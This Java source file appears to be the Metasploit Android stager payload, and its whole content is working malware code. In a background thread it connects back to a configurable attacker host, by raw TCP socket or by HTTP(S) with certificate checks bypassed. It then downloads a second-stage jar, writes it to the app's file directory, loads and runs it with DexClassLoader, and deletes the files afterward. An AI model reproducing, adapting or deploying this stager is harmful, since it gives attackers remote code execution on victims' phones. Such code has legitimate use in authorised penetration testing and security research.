package com.metasploit.stage;

import android.content.Context;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.HttpsURLConnection;

import dalvik.system.DexClassLoader;

public class Payload {

    public static final String LHOST =  		"XXXX127.0.0.1                       ";
    public static final String LPORT =  		"YYYY4444                            ";
    public static final String URL =    		"ZZZZ                                ";
    public static final String RETRY_TOTAL = 	"TTTT                                ";
    public static final String RETRY_WAIT = 	"SSSS                                ";

	private static final int URI_CHECKSUM_INITJ = 88;
	private static final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    private static final Random rnd = new Random();

    private static String[] parameters;
	private static int retryTotal;
	private static int retryWait;

	public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

	public static void startAsync() {
		new Thread() {
			@Override
			public void run() {
				// Execute the payload
				Payload.main(null);
			}
		}.start();
	}

    public static void startInPath(String path) {
        parameters = new String[] { path };
        startAsync();
    }

	public static void main(String[] args) {
        if (args != null) {
            File currentDir = new File(".");
            String path = currentDir.getAbsolutePath();
            parameters = new String[] { path };
        }
		try {
			retryTotal = Integer.parseInt(RETRY_TOTAL.substring(4).trim());
			retryWait = Integer.parseInt(RETRY_WAIT.substring(4).trim());
		} catch (NumberFormatException e) {
			return;
		}

        long retryEnd = System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(retryTotal);
		long retryDelay = TimeUnit.SECONDS.toMillis(retryWait);

		while (retryEnd > System.currentTimeMillis()) {
			startReverseConn();
			try {
				Thread.sleep(retryDelay);
			} catch (InterruptedException e) {
				return;
			}
		}
	}

	private static void startReverseConn() {
		try {
			if (URL.substring(4).trim().length() == 0) {
                reverseTCP();
            } else {
                reverseHTTP();
            }
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static String randomString(int len) {
		StringBuilder sb = new StringBuilder(len);
		for (int i = 0; i < len; i++) {
            sb.append(AB.charAt(rnd.nextInt(AB.length())));
        }
		return sb.toString();
	}

	private static int checksumText(String s) {
		int tmp = 0;
		for (int i = 0; i < s.length(); i++) {
            tmp += (int) s.charAt(i);
        }
		return tmp % 0x100;
	}

	private static void reverseHTTP() throws Exception {
		int checksum;
		String URI;
		HttpURLConnection urlConn;
		String lurl = URL.substring(4).trim();

		while (true) {
			URI = randomString(4);
			checksum = checksumText(URI);
			if (checksum == URI_CHECKSUM_INITJ)
				break;
		}

		String FullURI = "/" + URI;

		URL url = new URL(lurl + FullURI + "_" + randomString(16));

		if (lurl.startsWith("https")) {
			urlConn = (HttpsURLConnection) url.openConnection();
			Class.forName("com.metasploit.stage.PayloadTrustManager")
					.getMethod("useFor", new Class[] { URLConnection.class })
					.invoke(null, urlConn);
		} else {
            urlConn = (HttpURLConnection) url.openConnection();
        }

		urlConn.setDoInput(true);
		urlConn.setRequestMethod("GET");
		urlConn.connect();
		DataInputStream in = new DataInputStream(urlConn.getInputStream());

		loadStage(in, null, parameters);
		urlConn.disconnect();
	}

	private static void reverseTCP() throws Exception {
		String lhost = LHOST.substring(4).trim();
		String lport = LPORT.substring(4).trim();
		Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
		DataInputStream in = new DataInputStream(msgsock.getInputStream());
		OutputStream out = new DataOutputStream(msgsock.getOutputStream());
		loadStage(in, out, parameters);
	}

	private static void loadStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {

		String path = parameters[0];
		String filePath = path + File.separatorChar + "payload.jar";
		String dexPath = path + File.separatorChar + "payload.dex";

		// Read the class name
		int coreLen = in.readInt();
		byte[] core = new byte[coreLen];
		in.readFully(core);
		String classFile = new String(core);

		// Read the stage
		coreLen = in.readInt();
		core = new byte[coreLen];
		in.readFully(core);

		File file = new File(filePath);
		if (!file.exists()) {
			file.createNewFile();
		}
		FileOutputStream fop = new FileOutputStream(file);
		fop.write(core);
		fop.flush();
		fop.close();

		// Load the stage
		DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
				Payload.class.getClassLoader());
		Class<?> myClass = classLoader.loadClass(classFile);
		final Object stage = myClass.newInstance();
		file.delete();
		new File(dexPath).delete();
		myClass.getMethod("start",
				new Class[] { DataInputStream.class, OutputStream.class, String[].class })
				.invoke(stage, in, out, parameters);
	}
}
